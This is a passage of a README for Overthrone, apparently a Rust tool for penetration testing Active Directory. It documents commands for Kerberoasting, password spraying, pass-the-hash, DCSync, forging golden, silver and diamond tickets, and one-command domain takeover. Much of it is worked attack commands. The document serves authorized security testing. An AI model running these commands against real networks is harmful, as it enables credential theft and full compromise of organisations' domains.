| **Linux** | [`overthrone-linux-x86_64`](https://github.com/Karmanya03/Overthrone/releases/download/v0.1.1/overthrone-linux-x86_64) | x86_64 (musl, static) |
| **macOS** | [`overthrone-macos-aarch64`](https://github.com/Karmanya03/Overthrone/releases/download/v0.1.1/overthrone-macos-aarch64) | Apple Silicon (M1/M2/M3/M4) |

**Quick manual install:**

```bash
# Linux x86_64
curl -L https://github.com/Karmanya03/Overthrone/releases/download/v0.1.1/overthrone-linux-x86_64 -o ovt && chmod +x ovt && sudo mv ovt /usr/local/bin/

# macOS Apple Silicon
curl -L https://github.com/Karmanya03/Overthrone/releases/download/v0.1.1/overthrone-macos-aarch64 -o ovt && chmod +x ovt && sudo mv ovt /usr/local/bin/

# Kali (you're probably already here)
curl -L https://github.com/Karmanya03/Overthrone/releases/download/v0.1.1/overthrone-linux-x86_64 -o ovt && chmod +x ovt && sudo mv ovt /usr/local/bin/ && sudo apt install -y smbclient
```

### Build from source

For the trust-no-one crowd (respect — you're pentesters, paranoia is a job requirement):

```bash
git clone https://github.com/Karmanya03/Overthrone.git
cd Overthrone
cargo build --release

# Binaries at:
#   target/release/overthrone
#   target/release/ovt
# Same binary, two names. Like Clark Kent and Superman but less handsome.
```

### Post-install: smbclient

Overthrone is pure Rust with one external dependency. One. We tried to make it zero but `smb-rs` v0.11 doesn't expose directory listing yet. We're not bitter about it. (We're a little bitter about it.)

```bash
# Debian/Ubuntu/Kali
sudo apt install smbclient

# Arch (btw)
sudo pacman -S samba

# Fedora/RHEL
sudo dnf install samba-client

# macOS
brew install samba

# Windows
# Already there. Windows ships with SMB. It's the one time Windows having
# everything pre-installed actually works in your favor.
```

### Update

```bash
# Linux/macOS — same one-liner, overwrites old binary
curl -fsSL https://raw.githubusercontent.com/Karmanya03/Overthrone/main/install.sh | bash

# Windows PowerShell
irm https://raw.githubusercontent.com/Karmanya03/Overthrone/main/install.ps1 | iex

# From source
cd Overthrone && git pull && cargo build --release

# Via cargo
cargo install --git https://github.com/Karmanya03/Overthrone.git --force
```

### Uninstall

Changed your mind? Going back to Impacket? We understand. (We don't understand. But we'll pretend.)

```bash
# Linux/macOS — installed via script
rm -f ~/.local/bin/overthrone ~/.local/bin/ovt

# Linux/macOS — installed to /usr/local/bin
sudo rm -f /usr/local/bin/overthrone /usr/local/bin/ovt

# Windows PowerShell — installed via script
Remove-Item "$env:USERPROFILE\.local\bin\overthrone.exe" -Force
Remove-Item "$env:USERPROFILE\.local\bin\ovt.exe" -Force

# Windows PowerShell — installed to Program Files
Remove-Item "$env:ProgramFiles\Overthrone\overthrone.exe" -Force
Remove-Item "$env:ProgramFiles\Overthrone\ovt.exe" -Force

# Built from source
cargo uninstall overthrone
# or just delete the repo. We won't be offended. (We will be offended.)
```

### Platform Support

| Platform | Status | Notes |
|---|---|---|
| **Kali Linux** | Recommended | Everything pre-installed. `smbclient` already there. This is the way. This is always the way. |
| **Linux** | Full support | Primary dev platform. All features. `apt install smbclient` and go. |
| **Windows** | Full support | Yes, you can attack AD from a Windows box. The irony writes itself. Doesn't need `smbclient`. |
| **macOS** | Full support | Kerberos and LDAP work natively. `brew install samba` for SMB directory listing. Tim Cook would not approve. |
| **WSL** | Full support | The best of both worlds — Windows target, Linux attacker, one machine, one electrical outlet. |
| **FreeBSD** | Probably works | We haven't tested it. If you're pentesting AD from FreeBSD, you're a different breed and we salute you. |

## Changelog

### v0.1.1 — The "Total Control" Update

**New Features:**
- **BloodHound v4 Export**: Export users, groups, computers, and domains to BloodHound-compatible JSON.
- **Ccache Import**: Import Kerberos tickets from binary ccache files (v4) for Pass-the-Ticket.
- **Full LDAP Enumeration**: Complete implementation of user, group, and computer enumeration modules.
- **Attack Graph Engine**:
  - `GraphBuilder` fully implemented to digest enumeration data.
  - `PathFinder` added with `shortest_path`, `paths_to_da`, and `high_value_targets` queries.
- **overthrone-relay**: Entire crate — NTLM relay, LLMNR/NBT-NS/mDNS poisoning, ADCS relay.
- **overthrone-pilot**: Autonomous planner, executor, adaptive strategy, wizard mode, autopwn.
- **Inline Hash Cracking**: Embedded 10K wordlist, rayon parallel cracking, rule engine.
- **Auth Coercion**: PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, MS-EFSRPC.
- **ADCS**: ESC4, ESC5, ESC7, ESC8, CSR generation, PFX handling, web enrollment.
- **MSSQL**: Full TDS client, auth, linked server crawling.
- **Diamond Ticket**: Forge by modifying legit TGT PAC.
- **Port Scanner**: Async TCP connect scanner with CIDR support.
- **Plugin System**: Native DLL plugin loading with SmartSpray example.
- **TUI**: Terminal UI with live attack graph visualization.

**What We Claimed Was Done But Isn't (Honest Patch Notes™):**
- **~~Stub Elimination~~**: ~~Zero `unimplemented!()` or `todo!()` macros remain.~~ Three `todo!()` macros remain. They live in PsExec, SmbExec, and WmiExec. They've been paying rent so we let them stay.
- Five crypto files are one-line comments. We're counting them as "documented intentions."
- C2 integrations are "architecturally complete" (this is a euphemism for "the structs compile").

**Improvements:**
- `overthrone-reaper` now handles all LDAP object types.
- `overthrone-hunter` correctly parses ccache headers and credentials.
- `overthrone-core` graph module now supports weighted edges for cost-based pathfinding.

## Usage

### Quick Start — Autopwn

For when you want to go from "I have creds" to "I own the domain" in one command. The "I have a meeting in an hour and need to own a forest before the calendar invite pops up" option:

```bash
# Full form — for formal occasions
overthrone autopwn --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'

# Shorthand — for every other occasion
ovt autopwn --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
```

That's it. Overthrone enumerates, builds the attack graph, finds the shortest path to DA, executes it, DCSyncs, and generates a report. Go get coffee. Come back to a PDF that explains how you own the entire forest. The forest never saw it coming. Forests rarely do.

### Manual Mode

For the control freaks (and let's be honest, if you're reading a red team tool's README at 2 AM, you're a control freak — we say that with love):

```bash
# Step 1: Enumerate everything
# AD will tell you its entire life story. You just have to ask.
ovt enum --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'

# Step 2: Build and query the attack graph
# "How screwed is this domain?" — a visual answer.
ovt graph --path-to-da jsmith
ovt graph --shortest-path jsmith "Domain Admins"
ovt graph --kerberoastable-from jsmith
ovt graph --high-value-targets
ovt graph --export graph.json

# Step 3: Kerberoast
# Order tickets, crack offline. The DC doesn't even know you're attacking it.
ovt roast kerberoast --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
ovt roast asrep --dc 10.10.10.1 --domain corp.local -u jsmith

# Step 4: Spray (carefully — lockouts = engagement over = career over)
ovt spray --dc 10.10.10.1 --domain corp.local --users users.txt --password 'Winter2026!'

# Step 5: Lateral movement
# Be somewhere else. Then somewhere else. Then everywhere.
ovt move pth --target 10.10.10.50 --domain corp.local -u admin \
  --hash aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
ovt move exec --target 10.10.10.50 --command "whoami /all"

# Step 6: Persist
# Take the throne. Bolt it down. Change the locks. Hide the spare key.
ovt forge dcsync --dc 10.10.10.1 --domain corp.local -u dadmin -p 'G0tcha!'
ovt forge golden --krbtgt-hash <hash> --domain corp.local --domain-sid S-1-5-21-...
ovt forge silver --service-hash <hash> --service cifs/dc01.corp.local --domain corp.local

# Step 7: Report
# Turn chaos into compliance documentation. Alchemy, but for cybersecurity.
ovt report --format markdown --output engagement-report.md
ovt report --format json --output findings.json
# ovt report --format pdf  ← technically built, spiritually unconnected. Soon™.
```

### Command Reference

#### `ovt enum` — Enumeration

Asks Active Directory nicely for everything. AD complies because LDAP has no concept of shame, boundaries, or healthy personal space.

```bash
ovt enum [OPTIONS]
```

| Flag | Short | Required | Description |
|---|---|---|---|
| `--dc` | `-d` | Yes | Domain Controller IP or hostname |
| `--domain` | | Yes | Target domain (e.g., `corp.local`) |
| `--username` | `-u` | Yes | Domain username |
| `--password` | `-p` | Yes* | Password (*or use `--hash` — we don't discriminate) |
| `--hash` | | No | NT hash for Pass-the-Hash authentication |
| `--ldaps` | | No | Use LDAP over SSL (port 636). Fancy. |
| `--output` | `-o` | No | Save enumeration to JSON file |
| `--full` | | No | Include ACL enumeration (slower but finds the juicy stuff) |

```bash
# Basic enumeration
ovt enum --dc dc01.corp.local --domain corp.local -u jsmith -p 'Password1'

# Full enumeration with ACLs, saved to file
ovt enum --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Password1' --full -o enum.json

# Hash-based auth — because why crack it if you can just use it?
ovt enum --dc 10.10.10.1 --domain corp.local -u jsmith --hash 8846f7eaee8fb117ad06bdd830b7586c
```

#### `ovt graph` — Attack Graph

Turns your enumeration data into "oh no" moments for the blue team. It's like Google Maps but every route ends at Domain Admin.

```bash
ovt graph [SUBCOMMAND] [OPTIONS]
```

| Subcommand | Description |
|---|---|
| `--path-to-da <user>` | Find shortest paths from user to Domain Admins. Spoiler: it's usually 3 hops. |
| `--shortest-path <src> <dst>` | Find shortest path between any two nodes. |
| `--kerberoastable-from <user>` | Find reachable Kerberoastable accounts. Your GPU's shopping list. |
| `--unconstrained-from <user>` | Find reachable unconstrained delegation targets. (It's the print server.) |
| `--high-value-targets` | List all high-value targets with incoming edge counts. |
| `--stats` | Print graph statistics (nodes, edges, types). |
| `--export <file.json>` | Export full graph as JSON. Make conspiracy board. |

```bash
# "How screwed is the domain if jsmith gets phished?"
ovt graph --path-to-da jsmith

# Find the shortest path between two specific nodes
ovt graph --shortest-path "WEB-SERVER$" "Domain Admins"

# GPU shopping list
ovt graph --kerberoastable-from jsmith

# Export for visualization — clients love pictures
ovt graph --export attack-graph.json
```

#### `ovt roast` — Kerberoasting & AS-REP Roasting

Because service accounts with SPNs are basically "hack me" signs. They might as well have a neon arrow pointing at them.

```bash
ovt roast [kerberoast|asrep] [OPTIONS]
```

| Flag | Description |
|---|---|
| `kerberoast` | Request TGS tickets for all SPN accounts, output in hashcat/john format |
| `asrep` | Request AS-REP for accounts without pre-auth. Free hashes. |
| `--dc` | Domain Controller |
| `--domain` | Target domain |
| `-u`, `--username` | Username |
| `-p`, `--password` | Password |
| `--format` | Output format: `hashcat` (default) or `john` |
| `-o`, `--output` | Save hashes to file |

```bash
# Kerberoast — the DC literally gives you encrypted tickets to crack
ovt roast kerberoast --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Pass' -o kerberoast.txt

# AS-REP roast — for accounts that skipped authentication day
ovt roast asrep --dc 10.10.10.1 --domain corp.local -o asrep.txt

# Then crack offline (our job ends here, your GPU's job starts here)
hashcat -m 13100 kerberoast.txt wordlist.txt  # Kerberoast
hashcat -m 18200 asrep.txt wordlist.txt       # AS-REP
```

#### `ovt spray` — Password Spraying

Tries one password against many users. Respects lockout policies because getting 500 accounts locked at 9:01 AM on a Monday is how you get escorted out of the building by someone who is not smiling.

```bash
ovt spray [OPTIONS]
```

| Flag | Description |
|---|---|
| `--dc` | Domain Controller |
| `--domain` | Target domain |
| `--users` | File with usernames (one per line) |
| `--password` | Password to spray. Try `Season + Year + !` — it works more often than it should. |
| `--delay` | Delay between attempts in seconds (default: 1). Patience is a virtue. |
| `--lockout-threshold` | Max attempts per account (auto-detected if possible) |

```bash
# Spray a single password
ovt spray --dc 10.10.10.1 --domain corp.local --users users.txt --password 'Spring2026!'

# Extra careful mode — for when the lockout threshold is 3 and your hands are sweating
ovt spray --dc 10.10.10.1 --domain corp.local --users users.txt --password 'Welcome1' --delay 5
```

#### `ovt move` — Lateral Movement

You're in one box. You want to be in all boxes. This is the "why stay home when you can travel" module.

```bash
ovt move [pth|ptt|exec|smb] [OPTIONS]
```

| Subcommand | Protocol | What it does |
|---|---|---|
| `pth` | NTLM/SMB | Pass-the-Hash — your hash is your passport |
| `ptt` | Kerberos | Pass-the-Ticket — inject a .kirbi or .ccache. Identity theft, but for computers. |
| `exec` | WinRM/AtExec | Remote command execution. WinRM works perfectly. PsExec/SmbExec/WmiExec are "under construction" (they have very convincing hard hats). |
| `smb` | SMB2/3 | File operations — upload, download, browse. The file server doesn't judge. |

```bash
# Pass-the-Hash — the password is dead, long live the hash
ovt move pth --target 10.10.10.50 --domain corp.local -u admin \
  --hash aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# Execute command on remote host — like SSH but scarier
ovt move exec --target 10.10.10.50 --command "whoami /all"

# SMB file operations — the file server's open-door policy
ovt move smb --target 10.10.10.50 --share C$ --list /
ovt move smb --target 10.10.10.50 --share C$ --download /Windows/NTDS/ntds.dit
ovt move smb --target 10.10.10.50 --share C$ --upload payload.exe /Temp/totally-legit.exe
```

#### `ovt forge` — Persistence

You don't just take the throne. You superglue the crown to your head and throw away the key. Then forge a new key. Then throw that one away too.

```bash
ovt forge [dcsync|golden|silver|diamond] [OPTIONS]
```

| Subcommand | What it does |
|---|---|
| `dcsync` | Replicate all hashes from the DC via MS-DRSR. Every credential. The whole vault. |
| `golden` | Forge a Golden Ticket (needs KRBTGT hash). Be God. |
| `silver` | Forge a Silver Ticket (needs service account hash). Be a lesser god, but stealthier. |
| `diamond` | Forge a Diamond Ticket (modify legit TGT PAC). Be a god who passes audits. |

```bash
# DCSync — ask the DC to replicate all credentials to you. It will. Happily.
ovt forge dcsync --dc 10.10.10.1 --domain corp.local -u dadmin -p 'G0tcha!' -o hashes.txt

# Golden Ticket — be anyone, forever, or until someone resets KRBTGT twice (so, forever)
ovt forge golden \
  --krbtgt-hash <krbtgt_nt_hash> \
  --domain corp.local \
  --domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  --user Administrator \
  -o golden.kirbi

# Silver Ticket — targeted, stealthy, doesn't touch the DC
ovt forge silver \
  --service-hash <service_nt_hash> \
  --service cifs/fileserver.corp.local \
  --domain corp.local \
  --domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  --user Administrator \
  -o silver.kirbi

# Diamond Ticket — the stealth bomber. Modify a real TGT's PAC.
ovt forge diamond \
  --krbtgt-hash <krbtgt_nt_hash> \
  --domain corp.local \
  --user Administrator \
  -o diamond.kirbi
```

#### `ovt report` — Reporting

Turn your path of destruction into a compliance document. Alchemy, but for cybersecurity.

```bash
ovt report [OPTIONS]
```

| Flag | Description |
|---|---|
| `--format` | `markdown`, `json` (working), or `pdf` (built in scribe, not yet wired in CLI — it's complicated) |
| `--output`, `-o` | Output file path |
| `--template` | Custom report template (optional, for the aesthetically demanding) |
| `--executive` | Include executive summary (translates "we owned everything" into "there are areas for improvement") |

```bash
# Markdown for the team — detailed, technical, properly cited
ovt report --format markdown --executive -o final-report.md

# JSON for the SIEM — machines reading about machine compromise. How meta.
ovt report --format json -o findings.json
```

## Edge Types & Cost Model

The attack graph uses weighted edges. Lower cost = easier to exploit. The path-finding algorithm minimizes total cost, which means it finds the path of least resistance. Just like a real attacker. Just like electricity. Just like that one coworker who always finds the shortcut.

| Edge Type | Cost | Meaning |
|---|---|---|
| `MemberOf` | 0 | Group membership — free traversal, you already have it |
| `HasSidHistory` | 0 | SID History — legacy identity, free impersonation. A ghost from migrations past. |
| `Contains` | 0 | OU/GPO containment — structural relationship |
| `AdminTo` | 1 | Local admin — direct compromise, do not pass Go, do not collect $200 |
| `DcSync` | 1 | Replication rights — game over. The "I win" button. |
| `GenericAll` | 1 | Full control — you are God (of this specific object). |
| `ForceChangePassword` | 1 | Reset their password — aggressive but effective. They'll blame IT. |
| `Owns` | 1 | Object owner — can grant yourself anything. It's good to be the king. |
| `WriteDacl` | 1 | Modify permissions — give yourself GenericAll, then see above |
| `WriteOwner` | 1 | Change owner — give yourself Owns, then see above. Turtles. |
| `AllowedToDelegate` | 1 | Constrained delegation — impersonate to target service |
| `AllowedToAct` | 1 | RBCD — even sneakier delegation abuse |
| `HasSession` | 2 | Active session — credential theft opportunity. Someone's logged in. Their loss. |
| `GenericWrite` | 2 | Write attributes — targeted property abuse |
| `AddMembers` | 2 | Add to group — escalate via group membership. Invite yourself to the party. |
| `ReadLapsPassword` | 2 | Read LAPS — plaintext local admin password. Thanks, LAPS. Very cool. |
| `ReadGmsaPassword` | 2 | Read gMSA — service account password blob |
| `CanRDP` | 3 | RDP access — interactive logon, needs more effort |
| `CanPSRemote` | 3 | PS Remoting — command execution, less stealthy |
| `ExecuteDCOM` | 3 | DCOM execution — lateral movement via COM objects. Excel goes brrr. |
| `SQLAdmin` | 3 | SQL Server admin — `xp_cmdshell` is a "feature" |
| `TrustedBy` | 4 | Domain trust — cross-domain, requires more setup |
| `HasSpn` | 5 | Kerberoastable — offline cracking required. GPU time. |
| `DontReqPreauth` | 5 | AS-REP roastable — offline cracking required |
| `Custom(*)` | 10 | Unknown/custom — high cost, manual analysis needed |

## Protocol Stack

What Overthrone speaks fluently. Six languages, zero accent, all implemented in pure Rust:

| Protocol | Lines | Used for |
|---|---|---|
| **LDAP/LDAPS** | 1,173 | Domain enumeration, user/group/GPO/trust queries, ACL reading. AD's diary. |
| **Kerberos** | 1,580 | Authentication, TGT/TGS requests, ticket forging, roasting. The three-headed dog of authentication. |
| **SMB 2/3** | 1,423 | File operations, share enumeration, lateral movement, PtH. The universal remote of Windows networking. |
| **NTLM** | 730 | NT hash computation, NTLMv2 challenge-response, Pass-the-Hash. The protocol that refuses to die. |
| **MS-DRSR** | 801 | DCSync — replicating credentials via DRS RPC. Politely asking the DC for all credentials. The DC politely complies. |
| **MS-SAMR/RID** | 420 | SAM Remote — RID cycling, SID brute-force enumeration |
| **MSSQL/TDS** | 2,599 | Full TDS protocol client, auth, query execution, linked server crawling |
| **Remote Registry** | 1,001 | Remote registry manipulation via DCE/RPC |
| **DNS** | 114 | SRV record lookups for DC discovery via hickory-resolver |

Everything is implemented in Rust. No shelling out to `impacket`, no calling `mimikatz.exe`, no loading .NET assemblies, no Wine, no prayers to the Python dependency gods. Pure Rust protocol implementations talking raw bytes over the wire. The borrow checker suffered greatly so your engagements could prosper.

## Examples — Real Engagement Scenarios

### Scenario 1: "I just got a foothold"

You phished `jsmith` and have their creds. The phishing email was about a mandatory password reset. The irony is palpable.

```bash
# Enumerate the domain — ask AD to tell you everything about itself
ovt enum --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Phished123!' --full

# Find paths to DA — how many hops between "low privilege user" and "game over"?
ovt graph --path-to-da jsmith

# Output:
# Path 1 (cost: 6, hops: 3):
#   JSMITH --[MemberOf]--> IT-SUPPORT
#   IT-SUPPORT --[GenericAll]--> SVC-BACKUP
#   SVC-BACKUP --[AdminTo]--> DC01$
#
# Three hops. Three. The CISO will need to sit down.

# Kerberoast SVC-BACKUP (it has an SPN and a password from 2019)
ovt roast kerberoast --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Phished123!'
# Crack with hashcat... *GPU noises*
# Got SVC-BACKUP password: Backup2019!
# Of course it's Backup2019. Of course it is.

# PtH to DC01 as SVC-BACKUP
ovt move pth --target dc01.corp.local --domain corp.local -u SVC-BACKUP --hash racked_hash>

# DCSync everything — every hash in the domain, delivered to your doorstep
ovt forge dcsync --dc 10.10.10.1 --domain corp.local -u SVC-BACKUP -p 'Backup2019!'

# Generate report — the CISO will print this and frame it as a reminder
ovt report --format markdown --executive -o corp-local-report.md
```

### Scenario 2: "Spray and pray (but professionally)"

```bash
# Extract usernames from enumeration
ovt enum --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Pass' -o enum.json
# jq '.users[].sam_account_name' enum.json > users.txt

# Spray the classic — Season + Year + Special Character
ovt spray --dc 10.10.10.1 --domain corp.local --users users.txt --password 'Corp2026!'
# [+] Valid: mrodriguez:Corp2026!
# [+] Valid: pjohnson:Corp2026!
# 2 out of 847 users. That's a 0.2% hit rate. That's 2 too many.

# Check who has the juiciest access
ovt graph --path-to-da mrodriguez    # 5 hops. Meh.
ovt graph --path-to-da pjohnson      # 2 hops. Oh hello.
# pjohnson it is. Sorry Patricia, nothing personal.
```

### Scenario 3: "Full autopwn, I have a meeting in an hour"

```bash
ovt autopwn --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'

# Go get coffee. Actually, get two. One for you and one for your impending
# promotion after the client sees this report.
#
# Overthrone will:
# 1. Enumerate everything
# 2. Build attack graph
# 3. Find shortest path to DA
# 4. Execute the path (roast, spray, PtH, whatever works)
# 5. DCSync
# 6. Generate Markdown report
#
# Come back to: engagement-report.md
# Time elapsed: less than your coffee order took
```

## FAQ

**Q: Is this legal?**
A: With explicit written authorization (scope document, rules of engagement, the works) — absolutely. Without it — absolutely not. This is a professional penetration testing tool, not a "hack my ex's Facebook" tool. Get a contract. Be professional. Wear a hoodie ironically, not literally. The difference between a pentester and a criminal is a signed document and a really good PowerPoint presentation.

**Q: How is this different from BloodHound?**
A: BloodHound is incredible for visualization and path analysis. Overthrone uses a similar graph model but adds the exploitation, lateral movement, and persistence phases. Think of BloodHound as Google Maps and Overthrone as Google Maps + the getaway car + the safe house + a guy who changes your license plates. BloodHound shows you the path. Overthrone walks it. (Most of the way. PsExec still has a `todo!()`. We're working on it.)

**Q: How is this different from Impacket?**
A: Impacket is a legendary collection of Python protocol implementations and we have nothing but respect for it. Overthrone reimplements the same protocols in Rust with a unified framework, autonomous planning, and integrated reporting. Impacket is the toolbox. Overthrone is the factory that uses the toolbox, builds the product, packages it, and ships the report. Also, no `pip install` failures at 2 AM. We have `cargo build` failures at 2 AM instead. Progress.

**Q: Why Rust?**
A: Memory safety without a garbage collector. Single static binary. Native performance. No Python dependency hell. No "it works on my machine." No Wine. No .NET runtime. No "please install Java 8 specifically, not 11, not 17, 8." Also, explaining Rust lifetime errors to a rubber duck at 4 AM during an engagement builds character. We have a LOT of character. The borrow checker has personally victimized us 57,000 times (once per line of code).

**Q: Will this get caught by AV/EDR?**
A: Overthrone uses native protocol implementations (LDAP, Kerberos, SMB) that look identical to legitimate Windows traffic. It doesn't inject into processes, doesn't use PowerShell, doesn't drop .NET assemblies, and doesn't call suspicious Win32 APIs. It speaks the same language as a Windows machine because it literally implements the same protocols. That said, if you DCSync from a Linux box at 3 AM, any decent SOC will notice the existential crisis in their SIEM dashboard. Use responsibly.

**Q: Does it run on Linux?**
A: Linux is the *primary* platform. It attacks Windows Active Directory *over the network*. You don't need to be on Windows to speak Windows protocols. Same way you don't need to be a fish to go fishing.

**Q: Does it need Wine or Mimikatz or .NET?**
A: No. No. And no. Every protocol is native Rust. The whole point was to eliminate those dependencies. If you find yourself installing Wine to run Overthrone, something has gone terribly wrong and you should contact us immediately. Or a priest.

**Q: Can I extend it with custom modules?**
A: The plugin system supports native DLL loading with a full Plugin trait (manifest, capabilities, events). There's even a working SmartSpray example plugin. WASM plugin support exists in the same way that a blueprint exists for a house that hasn't been built yet. The workspace architecture makes it straightforward to add new modules. PRs welcome. Memes about Active Directory misconfigurations are also welcome.

**Q: What about the C2 integrations?**
A: The C2 trait system is genuinely well-designed — `C2Channel`, `C2Framework`, `C2Session` with full session management. The Sliver, Cobalt Strike, and Havoc implementations are... architecturally complete. This is a polite way of saying the structs exist and the functions return hardcoded values. Think of them as "aspirational code." They aspire to connect to real C2 frameworks. One day they might even succeed.

**Q: Does this work on Windows domains only?**
A: Active Directory is a Windows technology, so yes, the targets are Windows domains. But Overthrone itself runs on Linux, macOS, and Windows. Most pentesters run it from Kali, which is poetic justice — a free Linux distro dismantling enterprise Windows infrastructure.

**Q: My lab DC isn't responding to LDAP queries.**
A: Checklist: (1) you can reach port 389/636, (2) your user has domain credentials not local ones, (3) the domain name is correct, (4) you didn't fat-finger the password, (5) the DC is actually a DC and not a printer. We've all been there. (6) It's plugged in. Don't skip this one.

**Q: What's the difference between `overthrone` and `ovt`?**
A: Nothing. Same binary. Same code. `ovt` is just shorter. Like `ls` vs `list-directory-contents`. We added it because typing `overthrone` 47 times during an engagement gave someone carpal tunnel. (It was us. It gave us carpal tunnel.)

## Contributing

PRs welcome. Issues welcome. Memes about Active Directory misconfigurations are especially welcome. If your PR includes a pun in the commit message, it gets reviewed first.

### ✅ Done

- [x] LDAP enumeration (users, groups, computers, trusts, GPOs, OUs, ACLs, delegations) — 1,173 lines
- [x] Kerberos protocol implementation (AS-REQ/REP, TGS-REQ/REP, ticket parsing) — 1,580 lines
- [x] SMB 2/3 client (session setup, tree connect, named pipes) — 1,423 lines
- [x] NTLM (NT hash, NTLMv2 challenge-response, NTLMSSP) — 730 lines
- [x] MS-DRSR DCSync protocol — 801 lines
- [x] MSSQL/TDS client + linked server crawling — 2,599 lines
- [x] Remote Registry via DCE/RPC — 1,001 lines
- [x] DNS SRV lookups for DC discovery — 114 lines
- [x] Attack graph engine with Dijkstra pathfinding — 1,349 lines
- [x] Port scanner (async TCP connect, CIDR) — 681 lines
- [x] Kerberoasting & AS-REP roasting — full
- [x] Auth coercion (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce) — 799 lines
- [x] RBCD, constrained, unconstrained delegation abuse — full
- [x] Inline hash cracking (embedded wordlist, rayon, rule engine) — 878 lines
- [x] Ticket manipulation (request, cache, .kirbi/.ccache convert) — 795 lines
- [x] NTLM relay engine (multi-protocol) — 1,560 lines
- [x] LLMNR/NBT-NS/mDNS poisoner — 840 lines
- [x] ADCS relay (ESC8) — 359 lines
- [x] Golden Ticket forging with PAC construction — 753 lines
- [x] Silver Ticket forging — 150 lines
- [x] Diamond Ticket forging — 159 lines
- [x] DCSync per-user extraction — 685 lines
- [x] ACL backdoor persistence — 442 lines
- [x] DSRM backdoor — 101 lines
- [x] Skeleton Key orchestration — 155 lines
- [x] Forensic cleanup & validation — 975 lines
- [x] ADCS ESC4, ESC5, ESC7, ESC8 exploitation
- [x] ADCS enumeration (LDAP, web enrollment, CSR, PFX) — 2,489 lines
- [x] GPP cpassword decryption — 182 lines
- [x] GPP SYSVOL fetcher — 243 lines
- [x] Cross-domain trust mapping + SID filtering analysis — 544 lines
- [x] Inter-realm TGT forging — 883 lines
- [x] PAM trust analysis — 179 lines
- [x] Autonomous attack planner + executor — 5,900 lines total
- [x] Report generation (Markdown, JSON, MITRE ATT&CK mapping, mitigations) — 2,700 lines
- [x] Plugin system (native DLL loading + SmartSpray example) — 1,310 lines
- [x] WinRM execution (pure Rust WS-Man from Linux/macOS) — 480 lines
- [x] AtExec (scheduled tasks via ATSVC) — 529 lines
- [x] Interactive REPL shell — 2,470 lines
- [x] TUI with attack graph visualization — 1,087 lines
- [x] CLI with wizard, doctor, autopwn — 2,007 lines
- [x] `ovt` shorthand binary
- [x] 231 unit tests passing

### ⚠️ Partial (The "It's Complicated" Relationship Status)

- [ ] PsExec execution — 500 lines of packet building, `execute()` → `todo!()`. So close.
- [ ] SmbExec execution — service logic exists, `execute()` → `todo!()`. Even closer.
- [ ] WmiExec execution — SCM fallback works, main path → `todo!()`. Close-ish.
- [ ] Shadow Credentials — LDAP manipulation works, PKINIT auth is placeholder PEM. Half a masterpiece.
- [ ] WinRM Windows output collection — commands run, output says "not yet implemented." Existential.
- [ ] CLI PDF output — scribe has the renderer, CLI doesn't call it. Miscommunication.
- [ ] SCCM module — Windows-only WMI path, cross-platform incomplete.
- [ ] TUI crawler integration — "TODO: Integrate actual crawler when available." The crawler is available.

### ❌ Not Done Yet (The Backlog)

- [ ] ADCS ESC1 — the most common ADCS attack. We somehow forgor the main character.
- [ ] ADCS ESC2 — Any Purpose EKU abuse
- [ ] ADCS ESC3 — Enrollment agent abuse
- [ ] ADCS ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
- [ ] Crypto primitives (AES-CTS, HMAC, MD4, RC4, ticket crypto) — 5 files, 5 lines, 5 doc comments, 0 implementations
- [ ] LAPS v2 encrypted (CNG-DPAPI decryption) — waiting for DPAPI module
- [ ] DPAPI module — doesn't exist yet. The most referenced non-existent module in the codebase.
- [ ] Foreign LDAP queries (cross-domain enumeration) — 5 functions returning empty
- [ ] C2 Sliver integration — struct + hardcoded Ok()
- [ ] C2 Cobalt Strike integration — TCP field + Err("requires mutable access")
- [ ] C2 Havoc integration — REST client + vibes
- [ ] C2 implant deployment CLI wiring
- [ ] WASM plugin loader — "TODO: Initialize wasmtime::Engine"

## Star History

If you've read this far — all the way to the bottom of this absurdly long README, past the skeleton closet, past the shame table, past the crypto stubs that are literally one line each — you're legally obligated to star the repo. It's in the MIT license. (It's not in the MIT license. But it should be.)

**[Star this repo](https://github.com/Karmanya03/Overthrone)** — every star adds 0.001 damage to the attack graph. Every star also motivates us to implement one of those `todo!()` macros. Three stars and PsExec works. That's a promise. (That's not a promise.)

## Disclaimer

This tool is for **authorized security testing only**. Using Overthrone against systems without explicit written permission is illegal, unethical, and will make your parents disappointed. The authors are not responsible for misuse. If you use this tool without authorization, that's on you, your lawyer, and whoever has to explain to the judge what "DCSync" means while the jury stares blankly.

Always:
- Get written authorization before testing
- Define scope and rules of engagement
- Don't break things you weren't asked to break
- Report everything you find, especially the embarrassing stuff
- Remember that somewhere, a sysadmin set `Password1` on a service account and hoped nobody would notice

## License

MIT — use it, modify it, learn from it, build on it. Just don't be evil with it. And if you do something cool, tell us about it so we can pretend we helped.

***

<p align="center">
  <sub>Built with mass amounts of mass-produced instant coffee, mass amounts of Rust, and a mass personal grudge against misconfigured ACLs.</sub><br/>
  <sub>57,000 lines of Rust. 231 tests. 3 todo!() macros. 5 crypto stubs. 1 smbclient dependency. 0 regrets. (Some regrets.)</sub><br/>
  <sub>Every throne falls. The question is whether you find out from a pentester or from a ransomware note.</sub><br/>
  <sub>We prefer the first option. Your insurance company does too.</sub>
</p>